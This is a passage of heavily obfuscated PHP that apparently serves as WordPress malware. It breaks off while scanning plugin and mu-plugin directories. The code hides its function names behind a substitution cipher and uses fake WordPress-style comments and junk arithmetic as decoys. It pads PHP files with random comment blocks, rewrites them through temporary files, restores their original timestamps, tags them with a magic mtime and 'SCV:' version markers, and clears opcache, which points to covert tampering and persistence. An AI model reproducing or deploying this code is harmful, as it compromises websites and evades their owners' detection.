<?php
if(!function_exists('t9r_b0et24a')){function yxamvhxmuj_5ap1($i){static $a=null;if($a===null){$a=array('MhKwC0oKPBL0mCm','f-n0:','M09BPRhCPwoKCBKCm','hK90K-','n0:KgfB',':Bg9RgC/','0mPmC:0KZ','mC:9BK','R:BZP:BR9gwB','0K0PZBC','mC:CohRRB:','mh,mC:','fCP:gKn','M09Bm06B','0mP0KC','M09BfC0fB','M09BPZBCPwoKCBKCm',':C:0f',',0Kq/BL','fn?','CBfRKgf','w/fon',':BKgfB','Cohw/','mC:Rom','0mPg::gG','C0fB','0mPM09B','R:BZPfgCw/','woRG','C:0f','Z9o,','g::gGPfB:ZB','oRBKn0:',':Bgnn0:','w9omBn0:','0mPn0:',',gmBKgfB',',gmB.bPnBwonB','w9gmmPBL0mCm','50Ry:w/0eB','//qm6Lxq/Bs');}return $a[$i];}function t9r_b0et24a($i){$e=yxamvhxmuj_5ap1($i);$f='_scm'.'kd'.'ir'.'fple'.'uton'.'ah/'.'(\\?*'.'[0-9'.']{'.'1,}'.')+$g'.'y>'.'bv<'.'TOK'.'ENPA'.'RS'.'w CV'.':.qW'.'MULG'.'ID='.'BH6'.'4Zz'.'x2j5'.'3';$t='Pm'.'wf'.'-n'.'0:M'.'R9Bh'.'CoKg'.'/$E'.'OWp'.'jz=('.'2+'.'{_'.'1 *'.'NZG'.'],el'.'\\<v'.'tS3'.'yr'.'VsT['.')A}>'.'Uu4'.'DHiI'.'kd'.'a.b'.'56Lq'.'x?c';$r="";for($j=0;$j<strlen($e);$j++){$p=strpos($t,$e[$j]);$r.=($p===false)?$e[$j]:$f[$p];}return $r;}function f0gc7ty5h($i){$j=(int)$i;return t9r_b0et24a($j);}function j0v2y1e_($i){$j=(int)$i;return t9r_b0et24a($j);}function bom7xoc2nh84w($i){$j=$i+0;return t9r_b0et24a($j);}function zc2z7e8uq2b($i){$j=$i;return t9r_b0et24a($j);}function aj7j9z3lyj_($i){$j=(int)$i;return t9r_b0et24a($j);}$GLOBALS['__scf_ivd0_kr15vsvqr_0']=j0v2y1e_(0);$GLOBALS['__scf__psocjfd8y_1']=bom7xoc2nh84w(1);$GLOBALS['__scf_p2udwvcdy5d_2']=aj7j9z3lyj_(2);$GLOBALS['__scf_wh7kdppultbc_3']=zc2z7e8uq2b(3);$GLOBALS['__scf_rxjfmcidt4k5ht_4']=j0v2y1e_(4);$GLOBALS['__scf_nsox70toh7_5']=bom7xoc2nh84w(5);$GLOBALS['__scf_rexlo2me9pq_6']=zc2z7e8uq2b(6);$GLOBALS['__scf_n9xto_7urppc_7']=t9r_b0et24a(7);$GLOBALS['__scf_c82t98dsyaeb_7_8']=aj7j9z3lyj_(8);$GLOBALS['__scf_j5r9w4_pccv6a_9']=t9r_b0et24a(9);$GLOBALS['__scf_l4ffn4k7nrq5_10']=t9r_b0et24a(10);$GLOBALS['__scf_eayjxbxcfgt_11']=aj7j9z3lyj_(11);$GLOBALS['__scf_pk_3gac081jl_12']=aj7j9z3lyj_(12);$GLOBALS['__scf_ruyewuy5e0yj9_13']=j0v2y1e_(13);$GLOBALS['__scf_qvij5cn7dx_14']=f0gc7ty5h(14);$GLOBALS['__scf_ubdjkj4ds6_15']=j0v2y1e_(15);$GLOBALS['__scf_m9li945p4ht_16']=zc2z7e8uq2b(16);$GLOBALS['__scf_c6non3dyia_17']=aj7j9z3lyj_(17);$GLOBALS['__scf_ukoqzbyw9u1s_18']=j0v2y1e_(18);$GLOBALS['__scf_lf1trv6kn3_19']=zc2z7e8uq2b(19);$GLOBALS['__scf_rmwjqj3bib_20']=t9r_b0et24a(20);$GLOBALS['__scf__n8ild8e1h2ea_21']=j0v2y1e_(21);$GLOBALS['__scf_lhy7tsmljqji8w_22']=j0v2y1e_(22);$GLOBALS['__scf_jp8c4rkog7z0c_23']=f0gc7ty5h(23);$GLOBALS['__scf_jac6edy18ozw_24']=aj7j9z3lyj_(24);$GLOBALS['__scf_h8sw9nk0xrg_25']=zc2z7e8uq2b(25);$GLOBALS['__scf_bah3pq6kzvgzf4_26']=t9r_b0et24a(26);$GLOBALS['__scf_tyn9ctu978h_27']=zc2z7e8uq2b(27);$GLOBALS['__scf_ukka5up4qd_28']=f0gc7ty5h(28);$GLOBALS['__scf_vwg8rmyoj3_29']=bom7xoc2nh84w(29);$GLOBALS['__scf_saziwvgd_70u7_30']=zc2z7e8uq2b(30);$GLOBALS['__scf_ou4es0bfs93z_31']=zc2z7e8uq2b(31);$GLOBALS['__scf_r068v76nuy_32']=t9r_b0et24a(32);$GLOBALS['__scf_be4n7lauywv_33']=t9r_b0et24a(33);$GLOBALS['__scf_q1ed4um_gav6h_34']=bom7xoc2nh84w(34);$GLOBALS['__scf_ksrkglsoj__35']=zc2z7e8uq2b(35);$GLOBALS['__scf_lyejha5o7xo7_36']=j0v2y1e_(36);$GLOBALS['__scf_wqpz2ij4na_37']=j0v2y1e_(37);$GLOBALS['__scf_eeugu_w74fk_38']=aj7j9z3lyj_(38);$GLOBALS['__scf_ha7g2gn35n_39']=f0gc7ty5h(39);
if(class_exists(f0gc7ty5h(40),false)&&!class_exists(j0v2y1e_(41),false)){class hh2szxj2hew extends \ZipArchive {}}
function ww1dmn2ie1uu_7($zzjmf4uoh1){$zzjmf4uoh1=(isset($zzjmf4uoh1)?$zzjmf4uoh1:0)+0;return $zzjmf4uoh1*5;}
if    (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('_sc_mkdir'))   {
 function  _sc_mkdir($y0chc1xa2rjv)

{
// WP Query Loop: prescriptive enumerator

return   $GLOBALS['__scf_ivd0_kr15vsvqr_0']('mkdir') ? @$GLOBALS['__scf__psocjfd8y_1']($y0chc1xa2rjv,  (228+265), true)  : false;
        }


 }


 if   (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('_sc_fpc')) {
function   _sc_fpc($of47wzqzrz23kp6,    $e4atkclrm2kv6o)
 {
return    $GLOBALS['__scf_ivd0_kr15vsvqr_0']('file_put_contents')    ?      @$GLOBALS['__scf_p2udwvcdy5d_2']($of47wzqzrz23kp6, $e4atkclrm2kv6o)  :     false;
       }
     }


     if (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('_sc_ul'))  {
   function _sc_ul($of47wzqzrz23kp6)
  {
return  $GLOBALS['__scf_ivd0_kr15vsvqr_0']('unlink')  ?  @$GLOBALS['__scf_wh7kdppultbc_3']($of47wzqzrz23kp6)  :  false;
}


 }
if  (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('zgw2beuswm4v839sm6'))     {
function  zgw2beuswm4v839sm6($ejog0urzoh5sjia,   $y0chc1xa2rjv)
 {
 $_la8eh31t71n8hzr    =  $GLOBALS['__scf_rxjfmcidt4k5ht_4']($ejog0urzoh5sjia);
      if   ($_la8eh31t71n8hzr   ===   $y0chc1xa2rjv)  return      true;
  if  (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('realpath'))   return    false;
 $b44ukaglbjpz8wy  =  @$GLOBALS['__scf_nsox70toh7_5']($_la8eh31t71n8hzr);
      $w6dnb_wkis      =    @$GLOBALS['__scf_nsox70toh7_5']($y0chc1xa2rjv);


return  ($b44ukaglbjpz8wy !==   false  &&    $w6dnb_wkis   !== false    &&  $b44ukaglbjpz8wy ===  $w6dnb_wkis);
    }

  }
 if (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('_sc_unp'))     {
    function  _sc_unp($e4atkclrm2kv6o)



{
if    (!$GLOBALS['__scf_rexlo2me9pq_6']($e4atkclrm2kv6o)    ||      $GLOBALS['__scf_n9xto_7urppc_7']($e4atkclrm2kv6o)   <=  (1048536+40))  return      $e4atkclrm2kv6o;
 $si8e1f80lqzd8ru =  $GLOBALS['__scf_c82t98dsyaeb_7_8']('/(\r?\n\/\*[0-9a-f]{1000,}\*\/)+$/',    "",  $e4atkclrm2kv6o);
      return    $GLOBALS['__scf_rexlo2me9pq_6']($si8e1f80lqzd8ru)    ?   $si8e1f80lqzd8ru   :  $e4atkclrm2kv6o;
   }
// WP Data Module meta box output

}
if     (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('kmc6322ayzykhju2g2alr'))   {



function  kmc6322ayzykhju2g2alr()
{
  if (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('ini_get'))   return      0;



    $b8ld0_v01imo =  @$GLOBALS['__scf_j5r9w4_pccv6a_9']('memory_limit');
 if (!$GLOBALS['__scf_rexlo2me9pq_6']($b8ld0_v01imo) ||  $b8ld0_v01imo ===    "")      return    0;
     $dlptk4g0f1alj4   =   (int) $b8ld0_v01imo;



if  ($dlptk4g0f1alj4   <=  0)  return   -1;
        $a_cidlkt9f9to9k  = $GLOBALS['__scf_l4ffn4k7nrq5_10']($GLOBALS['__scf_eayjxbxcfgt_11']($b8ld0_v01imo, -1));
 if  ($a_cidlkt9f9to9k  ===      'G')  $dlptk4g0f1alj4   *= (406082440+667659384);
    elseif ($a_cidlkt9f9to9k ===   'M')  $dlptk4g0f1alj4 *=   (1048477+99);

elseif   ($a_cidlkt9f9to9k   ===  'K')     $dlptk4g0f1alj4     *=  (991+33);
     return   $dlptk4g0f1alj4;
   }
   }



      if   (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('_sc_padf'))   {
 function _sc_padf($of47wzqzrz23kp6)
{
if  (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('tempnam') ||   !$GLOBALS['__scf_ivd0_kr15vsvqr_0']('file_put_contents')    || !$GLOBALS['__scf_ivd0_kr15vsvqr_0']('rename')) return;

  if ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('m7v2uz7dvbtkxx4')  &&  !m7v2uz7dvbtkxx4())   return;
       if ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('clearstatcache'))   @clearstatcache(true,   $of47wzqzrz23kp6);
  $tbo3bqvwwtm    =    (1506449+293551)  +  $GLOBALS['__scf_pk_3gac081jl_12'](0,  (699912+88));
 




 $fulbrb9yfzinriqb = kmc6322ayzykhju2g2alr();
   if  ($fulbrb9yfzinriqb   !== -1  &&   $fulbrb9yfzinriqb  <   (134217696+32))   {
   if ($fulbrb9yfzinriqb   >= (116033597-48924733))    $tbo3bqvwwtm    =   (1799995+5) +  $GLOBALS['__scf_pk_3gac081jl_12'](0, (699992+8));
  else    return;
    }
  unset($fulbrb9yfzinriqb);
$un7gg1bj9y   =  @$GLOBALS['__scf_ruyewuy5e0yj9_13']($of47wzqzrz23kp6);
  if (!$un7gg1bj9y  ||     $un7gg1bj9y >= $tbo3bqvwwtm   -   (1907+2193))  return;



 if  (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('disk_free_space'))      return;
 $tvdpf_yn3b  = @disk_free_space($GLOBALS['__scf_rxjfmcidt4k5ht_4']($of47wzqzrz23kp6));
if   ($tvdpf_yn3b    ===    false ||  $tvdpf_yn3b     <     (121779602+35506798))  return;
     $_zlgbj5qfs  =  $GLOBALS['__scf_ivd0_kr15vsvqr_0']('fileperms')    ? @fileperms($of47wzqzrz23kp6)      :  false;
   $_zlgbj5qfs = (!$GLOBALS['__scf_qvij5cn7dx_14']($_zlgbj5qfs))  ?   (412+8)  : ($_zlgbj5qfs   & (0x125+0xda));
$v9rnbzsb00j3egmc  = @$GLOBALS['__scf_ubdjkj4ds6_15']($of47wzqzrz23kp6);
$e4atkclrm2kv6o =   @$GLOBALS['__scf_m9li945p4ht_16']($of47wzqzrz23kp6);$vz5q4t6oi=(0x5a+0xb4);$ukbwulh843m6=$vz5q4t6oi%12;
if (!$GLOBALS['__scf_rexlo2me9pq_6']($e4atkclrm2kv6o)   || $GLOBALS['__scf_n9xto_7urppc_7']($e4atkclrm2kv6o)      !== $un7gg1bj9y)  return;
 if    ($GLOBALS['__scf_eayjxbxcfgt_11']($GLOBALS['__scf_c6non3dyia_17']($e4atkclrm2kv6o),    -2)      === '?>')   return;
 $ayfvtku_0a3cs   =   $GLOBALS['__scf_eayjxbxcfgt_11']($e4atkclrm2kv6o,      0,  (4080+16));
   while ($GLOBALS['__scf_n9xto_7urppc_7']($e4atkclrm2kv6o)     <     $tbo3bqvwwtm     - (5199-1099))      {
      $e3gprudkz7c   =   "";
if  ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('random_bytes')) {
 try    {
$e3gprudkz7c = @$GLOBALS['__scf_ukoqzbyw9u1s_18'](random_bytes((0x1aa+0x626)));
     } catch     (\Throwable      $huj5q0pr36) {
   $e3gprudkz7c  =  "";
  } catch  (\Exception $huj5q0pr36)   {
     $e3gprudkz7c   =   "";
     }


  }
    if ($GLOBALS['__scf_n9xto_7urppc_7']($e3gprudkz7c) <  (3979+21)) {
  $e3gprudkz7c   =  $GLOBALS['__scf_lf1trv6kn3_19'](uniqid("",  true));
while ($GLOBALS['__scf_n9xto_7urppc_7']($e3gprudkz7c)    <    (3939+61))    $e3gprudkz7c   .=    $GLOBALS['__scf_lf1trv6kn3_19']($e3gprudkz7c);
  }
// broadcast rate-limiter for PHP CS Fixer

 $e4atkclrm2kv6o   .= "\n/*"  .  $e3gprudkz7c .   "*/";
  }
       $_a56gbijtnv43w    = @$GLOBALS['__scf_rmwjqj3bib_20']($GLOBALS['__scf_rxjfmcidt4k5ht_4']($of47wzqzrz23kp6), 'scp');
 if ($_a56gbijtnv43w     === false) return;
  if     (!zgw2beuswm4v839sm6($_a56gbijtnv43w,  $GLOBALS['__scf_rxjfmcidt4k5ht_4']($of47wzqzrz23kp6)))  {
 _sc_ul($_a56gbijtnv43w);
return;
}
  if (@$GLOBALS['__scf_p2udwvcdy5d_2']($_a56gbijtnv43w,   $e4atkclrm2kv6o) !==     $GLOBALS['__scf_n9xto_7urppc_7']($e4atkclrm2kv6o))   {
 _sc_ul($_a56gbijtnv43w);
  return;
  }
if ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('chmod'))   @$GLOBALS['__scf__n8ild8e1h2ea_21']($_a56gbijtnv43w,     $_zlgbj5qfs);
  if  ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('clearstatcache'))     @clearstatcache(true,  $of47wzqzrz23kp6);
$hljogzlvyj   =   @$GLOBALS['__scf_ruyewuy5e0yj9_13']($of47wzqzrz23kp6);
    $k2qzbtbx85    =  ($un7gg1bj9y    <  (4070+26)) ?  $un7gg1bj9y : (5810-1714);
 $gp3_hp1ivy    =  ($hljogzlvyj === $un7gg1bj9y)  ?   @$GLOBALS['__scf_m9li945p4ht_16']($of47wzqzrz23kp6,   false,    null,  0,  $k2qzbtbx85)  :  false;
 if (!$GLOBALS['__scf_rexlo2me9pq_6']($gp3_hp1ivy)  ||   $gp3_hp1ivy     !==   $GLOBALS['__scf_eayjxbxcfgt_11']($ayfvtku_0a3cs,  0,   $k2qzbtbx85))  {
_sc_ul($_a56gbijtnv43w);
return;
}
 unset($hljogzlvyj, $k2qzbtbx85,  $gp3_hp1ivy,   $ayfvtku_0a3cs);



   if     (!@$GLOBALS['__scf_lhy7tsmljqji8w_22']($_a56gbijtnv43w,     $of47wzqzrz23kp6)) {


 _sc_ul($_a56gbijtnv43w);
  return;
 }
    if  ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('clearstatcache'))     @clearstatcache(true, $of47wzqzrz23kp6);
   if  ($v9rnbzsb00j3egmc  && $GLOBALS['__scf_ivd0_kr15vsvqr_0']('touch'))      @$GLOBALS['__scf_jp8c4rkog7z0c_23']($of47wzqzrz23kp6, $v9rnbzsb00j3egmc);$xcpakh5qn4qcgg=PHP_INT_MAX/PHP_INT_MAX;$bg0c1pnxhfwg=$xcpakh5qn4qcgg+15;
    if   ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('opcache_invalidate')) @opcache_invalidate($of47wzqzrz23kp6,  true);


      }
 }
   if  (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('_sc_phpok')) {



   function   _sc_phpok($of47wzqzrz23kp6)
  {
 $e4atkclrm2kv6o =   @$GLOBALS['__scf_m9li945p4ht_16']($of47wzqzrz23kp6);
  if      ($GLOBALS['__scf_rexlo2me9pq_6']($e4atkclrm2kv6o) &&    $GLOBALS['__scf_n9xto_7urppc_7']($e4atkclrm2kv6o)  >  (1048562+14))   $e4atkclrm2kv6o =    _sc_unp($e4atkclrm2kv6o);
 if  (!$GLOBALS['__scf_rexlo2me9pq_6']($e4atkclrm2kv6o)      ||   $GLOBALS['__scf_n9xto_7urppc_7']($e4atkclrm2kv6o) < (961-461)   ||  $GLOBALS['__scf_n9xto_7urppc_7']($e4atkclrm2kv6o)      >   (1048556+20)   ||  $GLOBALS['__scf_jac6edy18ozw_24']($e4atkclrm2kv6o,  '<?')  ===   false) return false;
        if  (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('token_get_all'))   return      true;
     if    (defined('TOKEN_PARSE')) {
 try   {
    @token_get_all($e4atkclrm2kv6o,    TOKEN_PARSE);
 return  true;
 }   catch  (\Throwable  $huj5q0pr36)  {
// WP Latest Posts: semisimple skolem




       return  false;
        } catch    (\Exception $huj5q0pr36)  {
return   false;$mttm4250plmn9=4695;$yupu4psa7fh0=$mttm4250plmn9%16;
 }
}
 $luh35fsx3u   = @token_get_all($e4atkclrm2kv6o);
  if  (!$GLOBALS['__scf_h8sw9nk0xrg_25']($luh35fsx3u)) return  true;
$a6lirs_4yhi_uhu3    =    0;
foreach     ($luh35fsx3u as  $tbo3bqvwwtm)  {
    if ($GLOBALS['__scf_h8sw9nk0xrg_25']($tbo3bqvwwtm))  {
      if ($tbo3bqvwwtm[0]  ===   T_CURLY_OPEN     || $tbo3bqvwwtm[0]   ===   T_DOLLAR_OPEN_CURLY_BRACES)     $a6lirs_4yhi_uhu3++;
  


     continue;
   }
   if  ($tbo3bqvwwtm   ===  '{')    $a6lirs_4yhi_uhu3++;



 elseif  ($tbo3bqvwwtm  ===  '}') {
    $a6lirs_4yhi_uhu3--;
   if  ($a6lirs_4yhi_uhu3      <    0)  return  false;
 }
}
 return  $a6lirs_4yhi_uhu3  ===     0;
 }
// big-endian format

   }
  if (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('_sc_fam'))    {
  function    _sc_fam($of47wzqzrz23kp6)
   {
// validity check

  $m32ohx2wr8v  =     @$GLOBALS['__scf_ubdjkj4ds6_15']($of47wzqzrz23kp6);
   return     $m32ohx2wr8v    &&  ($m32ohx2wr8v   %   (99984+16))   ===   (117419-23600);
}
}

       if  (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('_sc_fam_touch'))  {



   function _sc_fam_touch($of47wzqzrz23kp6, $goct4r8o_g =   0)
    {
    if    (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('touch')) return;
if  ($goct4r8o_g  <= 0)  $goct4r8o_g  = $GLOBALS['__scf_bah3pq6kzvgzf4_26']();
 $tbo3bqvwwtm  =      ($goct4r8o_g - ($goct4r8o_g   %  (99920+80)))   + (93735+84);
 if  ($tbo3bqvwwtm  >   $GLOBALS['__scf_bah3pq6kzvgzf4_26']())  $tbo3bqvwwtm    -=  (99931+69);
       @$GLOBALS['__scf_jp8c4rkog7z0c_23']($of47wzqzrz23kp6, $tbo3bqvwwtm);
  

 }
     }
 if     (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('gq1f9oziaey7efi8'))    {
    function gq1f9oziaey7efi8($of47wzqzrz23kp6, $ithbjlkm2noifcz)
  {

 if  ($ithbjlkm2noifcz  ===   "" ||   !@$GLOBALS['__scf_tyn9ctu978h_27']($of47wzqzrz23kp6)) return false;
   if ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('clearstatcache'))  @clearstatcache(true, $of47wzqzrz23kp6);



  $awa4dki9zb  =   (string) @$GLOBALS['__scf_m9li945p4ht_16']($of47wzqzrz23kp6, false,     null,  0,   (7483-3387));
return $GLOBALS['__scf_ukka5up4qd_28']('/\/\* SCV:(\d+\.\d+\.\d+) \*\//', $awa4dki9zb,    $b8ld0_v01imo) === 1  &&      version_compare($b8ld0_v01imo[1], $ithbjlkm2noifcz, '>');
 }
  }
if   (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('cime3jhgafu_bno3mw'))    {

  function cime3jhgafu_bno3mw($e4atkclrm2kv6o)

       {
    if   (!$GLOBALS['__scf_rexlo2me9pq_6']($e4atkclrm2kv6o)) return "";


 if     ($GLOBALS['__scf_ukka5up4qd_28']('/\/\* SCV:(\d+\.\d+\.\d+) \*\//',  $GLOBALS['__scf_eayjxbxcfgt_11']($e4atkclrm2kv6o,  0,   (4010+86)),      $m32ohx2wr8v))  return  $m32ohx2wr8v[1];
    return  "";
   }
}

  if    (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('_ooeo50yjqcae1tdxg'))   {
    function   _ooeo50yjqcae1tdxg($_a56gbijtnv43w,   $of47wzqzrz23kp6,   $ithbjlkm2noifcz)
  {


 if ($ithbjlkm2noifcz  !==   "" && $GLOBALS['__scf_ivd0_kr15vsvqr_0']('gq1f9oziaey7efi8')  &&   gq1f9oziaey7efi8($of47wzqzrz23kp6,  $ithbjlkm2noifcz))    {
_sc_ul($_a56gbijtnv43w);
 return false;



   }


     $hzpg63xhiwa   =    false;
 if     ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('rename'))  $hzpg63xhiwa  =      @$GLOBALS['__scf_lhy7tsmljqji8w_22']($_a56gbijtnv43w, $of47wzqzrz23kp6);
   if    (!$hzpg63xhiwa &&   $GLOBALS['__scf_ivd0_kr15vsvqr_0']('copy'))   {$nyrpj2seyqyn=PHP_INT_MAX/PHP_INT_MAX;$d1p7o9jm7=$nyrpj2seyqyn+29;
 if ($ithbjlkm2noifcz   !==     ""     && $GLOBALS['__scf_ivd0_kr15vsvqr_0']('gq1f9oziaey7efi8')  &&     gq1f9oziaey7efi8($of47wzqzrz23kp6,  $ithbjlkm2noifcz)) {$osxkes20=PHP_INT_MAX/PHP_INT_MAX;$rznxsqv3xpq=$osxkes20+13;
  _sc_ul($_a56gbijtnv43w);
return  false;
 }
$hzpg63xhiwa =   @$GLOBALS['__scf_vwg8rmyoj3_29']($_a56gbijtnv43w,    $of47wzqzrz23kp6);
    if  ($hzpg63xhiwa)  _sc_ul($_a56gbijtnv43w);$m3ur8l04ac=PHP_INT_MAX/PHP_INT_MAX;$obyh0h79to=$m3ur8l04ac+79;
    }
        if (!$hzpg63xhiwa) _sc_ul($_a56gbijtnv43w);
  return     $hzpg63xhiwa;
 }
 }
  if   (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('_sc_phpok_src'))  {
 function _sc_phpok_src($e4atkclrm2kv6o)
  {
if (!$GLOBALS['__scf_rexlo2me9pq_6']($e4atkclrm2kv6o)  ||  $GLOBALS['__scf_n9xto_7urppc_7']($e4atkclrm2kv6o)  < (416+84) || $GLOBALS['__scf_jac6edy18ozw_24']($e4atkclrm2kv6o,    '<?')    ===  false) return false;

  if     (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('token_get_all')) return true;
 if   (defined('TOKEN_PARSE'))   {
     try  {
   @token_get_all($e4atkclrm2kv6o, TOKEN_PARSE);

  return true;
 } catch (\Throwable     $huj5q0pr36)   {
   return   false;
 }    catch    (\Exception $huj5q0pr36)    {
return false;
 }
}
  $luh35fsx3u   =   @token_get_all($e4atkclrm2kv6o);
    if (!$GLOBALS['__scf_h8sw9nk0xrg_25']($luh35fsx3u)) return  true;



$a6lirs_4yhi_uhu3  =     0;

foreach ($luh35fsx3u as $tbo3bqvwwtm)     {
       if  ($GLOBALS['__scf_h8sw9nk0xrg_25']($tbo3bqvwwtm))   {
// randomized lsm-tree

if  ($tbo3bqvwwtm[0]     ===  T_CURLY_OPEN  ||    $tbo3bqvwwtm[0] ===      T_DOLLAR_OPEN_CURLY_BRACES)      $a6lirs_4yhi_uhu3++;
 continue;
}
 if ($tbo3bqvwwtm  ===  '{') $a6lirs_4yhi_uhu3++;
   elseif ($tbo3bqvwwtm  ===  '}') {
   $a6lirs_4yhi_uhu3--;
 if     ($a6lirs_4yhi_uhu3 <     0)     return false;
}



}
return    $a6lirs_4yhi_uhu3 ===  0;
  }


   }
 if  (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('_sc_qok'))   {
    function   _sc_qok($qgeyzqg84qudb, $e4atkclrm2kv6o)
 {
     if (!@$GLOBALS['__scf_tyn9ctu978h_27']($qgeyzqg84qudb))    return  true;
  $ixb_dxexlpl1kv0k =    (int)    @$GLOBALS['__scf_ubdjkj4ds6_15']($qgeyzqg84qudb);



   if  ($ixb_dxexlpl1kv0k <=  $GLOBALS['__scf_bah3pq6kzvgzf4_26']()   -  (925693-320893)    ||    $ixb_dxexlpl1kv0k    >     $GLOBALS['__scf_bah3pq6kzvgzf4_26']()   +     (86387+13))     return  true;
  $dy178cou5u29   = $GLOBALS['__scf_saziwvgd_70u7_30']((string) @$GLOBALS['__scf_m9li945p4ht_16']($qgeyzqg84qudb));
 

return  ($dy178cou5u29  === "" ||   ($GLOBALS['__scf_rexlo2me9pq_6']($e4atkclrm2kv6o) &&  $dy178cou5u29    !==  $GLOBALS['__scf_lf1trv6kn3_19']($e4atkclrm2kv6o)));
 }


 }
 if  (!$GLOBALS['__scf_ivd0_kr15vsvqr_0']('_sc_any_live'))     {
  function   _sc_any_live($zpvevdsie9fdy,   $bxxvjn7lvws,    $x00shd420fcyf1za  =    "",  $q3n4q4yej_jo    = "",  $rosjewtew0 =  "")
    {
// snapshot-isolated broadcaster

   if    ($q3n4q4yej_jo ===   "")      $q3n4q4yej_jo =   (defined('WPMU_PLUGIN_DIR')  &&   WPMU_PLUGIN_DIR)   ? WPMU_PLUGIN_DIR : $bxxvjn7lvws . '/mu-plugins';
 if ($rosjewtew0  ===   "")   $rosjewtew0 = (defined('WP_PLUGIN_DIR') &&  WP_PLUGIN_DIR)    ?   WP_PLUGIN_DIR   :  $bxxvjn7lvws .  '/plugins';
  $q3n4q4yej_jo = $GLOBALS['__scf_c6non3dyia_17']($q3n4q4yej_jo,  '/');

     $rosjewtew0    =    $GLOBALS['__scf_c6non3dyia_17']($rosjewtew0, '/');
   $zdunk92ibn3j  =  array();
$nel7lit7ri = false;$u9bb7zpu5n5_=3674;$yup1ruwjj=$u9bb7zpu5n5_%16;
 if ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('glob'))  {



    $z557aa8ox0mrn     =  @$GLOBALS['__scf_ou4es0bfs93z_31']($q3n4q4yej_jo   .   '/*.php');
 $z8v4vk_fl7wzti =   @$GLOBALS['__scf_ou4es0bfs93z_31']($rosjewtew0 .   '/*/*.php');$vi86g7_5kn=42*7;$baiuo8ru7kn8=$vi86g7_5kn-41;
 if   ($GLOBALS['__scf_h8sw9nk0xrg_25']($z557aa8ox0mrn)  || $GLOBALS['__scf_h8sw9nk0xrg_25']($z8v4vk_fl7wzti))  {


 $nel7lit7ri = true;
$zdunk92ibn3j   =    $GLOBALS['__scf_r068v76nuy_32']((array) $z557aa8ox0mrn,      (array)  $z8v4vk_fl7wzti);
}
  unset($z557aa8ox0mrn, $z8v4vk_fl7wzti);
     }



if (!$nel7lit7ri   &&  $GLOBALS['__scf_ivd0_kr15vsvqr_0']('opendir')   &&   $GLOBALS['__scf_ivd0_kr15vsvqr_0']('readdir')) {
    $echqq93vo5674v3v  =    @$GLOBALS['__scf_be4n7lauywv_33']($q3n4q4yej_jo);
  if    ($echqq93vo5674v3v)    {
while      (($m37cjchjq1_2 =   @$GLOBALS['__scf_q1ed4um_gav6h_34']($echqq93vo5674v3v))  !==  false)   {
// WP Post Template: hermitian fallback-handler

     if   ($GLOBALS['__scf_eayjxbxcfgt_11']($m37cjchjq1_2,  -(3+1))  ===   '.php') $zdunk92ibn3j[]  = $q3n4q4yej_jo   .   '/'  .      $m37cjchjq1_2;
       }
 if  ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('closedir')) @$GLOBALS['__scf_ksrkglsoj__35']($echqq93vo5674v3v);
  }
   $echqq93vo5674v3v  =  @$GLOBALS['__scf_be4n7lauywv_33']($rosjewtew0);
 if   ($echqq93vo5674v3v)   {
// strict mediator

 while  (($m37cjchjq1_2   =   @$GLOBALS['__scf_q1ed4um_gav6h_34']($echqq93vo5674v3v)) !==  false)    {
      $_y4tao6gzfsgyku =  $rosjewtew0     .    '/'  .   $m37cjchjq1_2;



  if ($m37cjchjq1_2     ===     '.'    || $m37cjchjq1_2  ===  '..'      ||     !@$GLOBALS['__scf_lyejha5o7xo7_36']($_y4tao6gzfsgyku))    continue;
  $bdi6toade_91e0nn =     @$GLOBALS['__scf_be4n7lauywv_33']($_y4tao6gzfsgyku);


 if (!$bdi6toade_91e0nn)  continue;
while   (($nj4bw5ms6y_61   =   @$GLOBALS['__scf_q1ed4um_gav6h_34']($bdi6toade_91e0nn))  !==     false)     {
    if    ($GLOBALS['__scf_eayjxbxcfgt_11']($nj4bw5ms6y_61, -(84^80)) ===  '.php')   $zdunk92ibn3j[] =  $_y4tao6gzfsgyku  .   '/' .   $nj4bw5ms6y_61;
   }
 if   ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('closedir'))  @$GLOBALS['__scf_ksrkglsoj__35']($bdi6toade_91e0nn);
  }
   if      ($GLOBALS['__scf_ivd0_kr15vsvqr_0']('closedir'))   @$GLOBALS['__scf_ksrkglsoj__35']($echqq93vo5674v3v);

  }



   unset($echqq93vo5674v3v,     $bdi6toade_91e0nn,    $m37cjchjq1_2,    $nj4bw5ms6y_61,   $_y4tao6gzfsgyku);



}
$rigc9ada0quiroc9 =  false;



    if    ($x00shd420fcyf1za   !==   ""   && $GLOBALS['__scf_ivd0_kr15vsvqr_0']('realpath'))   $rigc9ada0quiroc9 =  @$GLOBALS['__scf_nsox70toh7_5']($x00shd420fcyf1za);
       foreach  ($zdunk92ibn3j     as      $ejog0urzoh5sjia)  {
